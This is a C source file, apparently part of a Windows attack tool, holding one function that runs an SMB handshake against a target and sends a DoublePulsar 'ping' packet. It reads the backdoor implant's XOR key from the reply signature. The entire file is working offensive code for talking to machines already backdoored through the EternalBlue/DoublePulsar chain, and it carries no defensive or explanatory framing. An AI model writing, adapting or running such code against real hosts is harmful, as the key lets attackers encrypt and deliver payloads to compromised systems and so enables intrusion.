#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    uint8_t negotiate_packet[sizeof(SMB_NEGOTIATE_PKT)];
    uint8_t session_setup_packet[sizeof(SMB_SESSION_SETUP_PKT)];
    uint8_t tree_connect_packet[sizeof(SMB_TREE_CONNECT_PKT)];
    uint8_t ping_packet[sizeof(DP_PING_PKT)];
    uint8_t *packets[4];
    size_t packet_lengths[4];
    SOCKET sock;
    uint8_t *response = NULL;
    size_t response_size = 0;
    unsigned int result = 0;
    int i;

    if (ip == NULL || port <= 0 || port > 65535)
        return 0;

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(negotiate_packet));
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, sizeof(session_setup_packet));
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_connect_packet));
    memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));

    packets[0] = negotiate_packet;
    packets[1] = session_setup_packet;
    packets[2] = tree_connect_packet;
    packets[3] = ping_packet;

    packet_lengths[0] = sizeof(SMB_NEGOTIATE_PKT) - 1;
    packet_lengths[1] = sizeof(SMB_SESSION_SETUP_PKT) - 1;
    packet_lengths[2] = sizeof(SMB_TREE_CONNECT_PKT) - 1;
    packet_lengths[3] = sizeof(DP_PING_PKT) - 1;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    for (i = 0; i < 4; ++i) {
        size_t sent_total = 0;
        uint8_t header[4];
        size_t received_total;
        size_t frame_length;

        if (packet_lengths[i] > (size_t)INT_MAX)
            goto cleanup;

        while (sent_total < packet_lengths[i]) {
            int sent = send(sock,
                            (const char *)packets[i] + sent_total,
                            (int)(packet_lengths[i] - sent_total),
                            0);
            if (sent == SOCKET_ERROR || sent == 0)
                goto cleanup;
            sent_total += (size_t)sent;
        }

        received_total = 0;
        while (received_total < sizeof(header)) {
            int received = recv(sock,
                                (char *)header + received_total,
                                (int)(sizeof(header) - received_total),
                                0);
            if (received == SOCKET_ERROR || received == 0)
                goto cleanup;
            received_total += (size_t)received;
        }

        if (header[0] != 0)
            goto cleanup;

        frame_length = ((size_t)header[1] << 16) |
                       ((size_t)header[2] << 8) |
                       (size_t)header[3];

        free(response);
        response = NULL;
        response_size = frame_length + sizeof(header);
        response = (uint8_t *)malloc(response_size);
        if (response == NULL)
            goto cleanup;

        memcpy(response, header, sizeof(header));
        received_total = sizeof(header);
        while (received_total < response_size) {
            size_t remaining = response_size - received_total;
            int received = recv(sock,
                                (char *)response + received_total,
                                (int)remaining,
                                0);
            if (received == SOCKET_ERROR || received == 0)
                goto cleanup;
            received_total += (size_t)received;
        }

        if (i == 1) {
            if (response_size < 34)
                goto cleanup;
            memcpy(tree_connect_packet + 32, response + 32, 2);
        } else if (i == 2) {
            if (response_size < 34)
                goto cleanup;
            memcpy(ping_packet + 28, response + 28, 2);
            memcpy(ping_packet + 32, response + 32, 2);
        } else if (i == 3) {
            size_t signature_start = (size_t)SMB_RESP_SIGNATURE_START;
            size_t signature_end = (size_t)SMB_RESP_SIGNATURE_END;
            size_t signature_count;
            size_t signature_limit;

            if (signature_end >= signature_start &&
                signature_end - signature_start == 4) {
                signature_count = 4;
                signature_limit = signature_end;
            } else if (signature_end >= signature_start &&
                       signature_end - signature_start == 3) {
                signature_count = 4;
                signature_limit = signature_end + 1;
            } else {
                goto cleanup;
            }

            if (signature_limit > response_size ||
                signature_start > response_size ||
                signature_count > response_size - signature_start)
                goto cleanup;

            result = (unsigned int)response[signature_start] |
                     ((unsigned int)response[signature_start + 1] << 8) |
                     ((unsigned int)response[signature_start + 2] << 16) |
                     ((unsigned int)response[signature_start + 3] << 24);
        }
    }

cleanup:
    free(response);
    closesocket(sock);
    return result;
}